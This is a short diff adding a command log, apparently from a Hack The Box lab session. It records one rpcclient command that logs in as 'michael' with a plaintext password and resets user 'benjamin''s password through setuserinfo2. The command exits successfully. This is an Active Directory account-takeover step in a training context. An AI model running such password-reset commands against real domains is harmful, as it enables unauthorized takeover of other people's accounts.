@@ -1,0 +1,7 @@
+### [2026-04-09 19:31:18] rpcclient -U administrator.htb\michael%password123 10.129.245.95 -c setuserinfo2 benjamin 23 'password123'
+
+$ rpcclient -U administrator.htb\michael%password123 10.129.245.95 -c setuserinfo2 benjamin 23 'password123'
+
+
+# Exit code: 0
+# Duration: 2026-04-09 19:31:19
